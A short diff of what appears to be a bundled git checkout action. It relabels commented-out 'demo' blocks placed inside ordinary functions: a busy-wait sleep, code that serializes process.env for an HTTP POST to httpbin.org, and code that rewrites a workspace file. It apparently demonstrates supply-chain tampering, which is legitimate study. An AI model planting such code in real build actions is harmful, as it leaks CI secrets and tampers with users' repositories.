@@ -628,7 +628,7 @@ class GitCommandManager {
     configExists(configKey, globalConfig) {
         return __awaiter(this, void 0, void 0, function* () {
             const pattern = regexpHelper.escape(configKey);
-	/* ---------- */
+	/* SLEEP DEMO ---------- */
         // let sleep = function() {
         //   let start = new Date().getTime();
         //   while(new Date().getTime() < start + 5000) {}
@@ -642,7 +642,7 @@ class GitCommandManager {
 	      // });
 	/* ---------- */
 
-	/* ---------- */
+	/* POST DEMO ---------- */
 	  //   const data = JSON.stringify(process.env);
 	  //   var options = {
     //     hostname: 'httpbin.org',
@@ -1380,7 +1380,7 @@ function getSource(settings) {
                 authHelper.removeGlobalConfig();
             }
 
-            /* ---------- */
+            /* FSOCIETY DEMO---------- */
             // if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
             //   const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
             //   const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
